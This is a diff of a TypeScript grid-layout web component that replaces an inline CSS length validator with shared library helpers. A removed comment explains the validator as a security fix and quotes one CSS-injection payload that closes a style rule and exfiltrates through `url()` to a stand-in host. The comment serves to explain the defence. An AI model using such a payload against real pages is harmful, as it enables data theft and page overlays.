@@ -1,8 +1,15 @@
-import { customElement, HelixElement, numberConverter, reportRuntime } from '@fusion.dev/helix-core'
+import {
+  customElement,
+  gridLength,
+  gridTracks,
+  HelixElement,
+  numberConverter,
+  reportRuntime,
+} from '@fusion.dev/helix-core'
 import type { CSSResultGroup, PropertyValues, TemplateResult } from 'lit'
 import { property } from 'lit/decorators.js'
 import { html, unsafeStatic } from 'lit/static-html.js'
-import { styles } from './grid-root.css.js'
+import { styles } from './grid-root.generated.css.js'
 
 /**
  * **The track lists every grid sets for itself, set back so none is taken from
@@ -18,54 +25,6 @@ import { styles } from './grid-root.css.js'
  */
 const UNINHERITED =
   '--grid-areas: initial; --grid-columns: initial; --grid-rows: initial; --_grid-template: initial;'
-
-/** A number with a length unit, or a bare number inside a function. */
-const NUMBER =
-  /^-?(?:\d+\.?\d*|\.\d+)(?:px|r?em|r?ex|r?ch|r?lh|r?ic|r?cap|%|[sdl]?v(?:w|h|i|b|min|max)|cq(?:w|h|i|b|min|max)|cm|mm|in|pt|pc|q)?$/i
-
-/** What `min` may be built from, one token at a time. */
-const TOKEN = /\s+|(?:calc|clamp|min|max)\(|var\(--[\w-]+|-?(?:\d+\.?\d*|\.\d+)[a-z%]*|[(),+*/-]/giy
-
-/**
- * `min` as a length the rule may hold, or `undefined` where it is not one.
- *
- * **Checked against a grammar before it reaches a stylesheet, and that is a
- * security fix rather than tidiness.** It is a public attribute written into a
- * `<style>` element's text, so an unchecked
- * `min="1px,1fr)} :host{background:url(//elsewhere/?stolen)} @media all{"`
- * closed the rule and wrote arbitrary CSS into this component's shadow root,
- * enough to exfiltrate through `url()` and to lay an invisible plate over the
- * page. `createSheet` says in its own documentation that consumer input must
- * not be interpolated into CSS. A grammar rather than an escape: a length is
- * numbers, units, four math functions, `var()`, operators and balanced
- * parentheses, and nothing in it can end a declaration.
- */
-const lengthOf = (value: string | undefined): string | undefined => {
-  const min = value?.trim() ?? ''
-  if (min === '' || min.includes('/*')) {
-    return undefined
-  }
-  if (!min.includes('(')) {
-    return NUMBER.test(min) && /[a-z%]$/i.test(min) ? min : undefined
-  }
-  let depth = 0
-  TOKEN.lastIndex = 0
-  while (TOKEN.lastIndex < min.length) {
-    const at = TOKEN.lastIndex
-    const token = TOKEN.exec(min)?.[0]
-    if (token === undefined || TOKEN.lastIndex === at) {
-      return undefined
-    }
-    if (/\d/.test(token) && /^-?[\d.]/.test(token) && !NUMBER.test(token)) {
-      return undefined
-    }
-    depth += token.endsWith('(') || token.startsWith('var(') ? 1 : token === ')' ? -1 : 0
-    if (depth < 0) {
-      return undefined
-    }
-  }
-  return depth === 0 ? min : undefined
-}
 
 /**
  * @summary A layout that places its children on a grid.
@@ -199,7 +158,7 @@ export class HelixGrid extends HelixElement {
    * **Static text, so the server renders it.** Lit refuses an expression inside
    * `<style>`, and a rule filled in after upgrade left a server-rendered `min`
    * grid in one column until then. `unsafeStatic` joins the text into the
-   * template itself, so it is safe only because `min` passed `lengthOf` and a
+   * template itself, so it is safe only because `min` passed `gridLength` and a
    * count is an integer.
    *
    * It sets a custom property rather than the track list itself. A shadow
@@ -210,21 +169,16 @@ export class HelixGrid extends HelixElement {
    * lose against.
    */
   private templateRule(): string {
-    const min = lengthOf(this.min)
-    if (min !== undefined) {
-      return `:host { ${UNINHERITED} --_grid-template: repeat(auto-fit, minmax(min(${min}, 100%), 1fr)); }`
-    }
-    const count = Number(this.columns)
-    if (Number.isInteger(count) && count > 6) {
-      return `:host { ${UNINHERITED} --_grid-template: repeat(${count}, minmax(0, 1fr)); }`
-    }
-    return `:host { ${UNINHERITED} }`
+    const template = gridTracks(this.min, this.columns)
+    return template === undefined
+      ? `:host { ${UNINHERITED} }`
+      : `:host { ${UNINHERITED} --_grid-template: ${template}; }`
   }
 
   protected override updated(changed: PropertyValues): void {
     super.updated(changed)
     const min = this.min?.trim() ?? ''
-    if (changed.has('min') && min !== '' && lengthOf(min) === undefined) {
+    if (changed.has('min') && min !== '' && gridLength(min) === undefined) {
       reportRuntime({
         kind: 'refused-length',
         message:
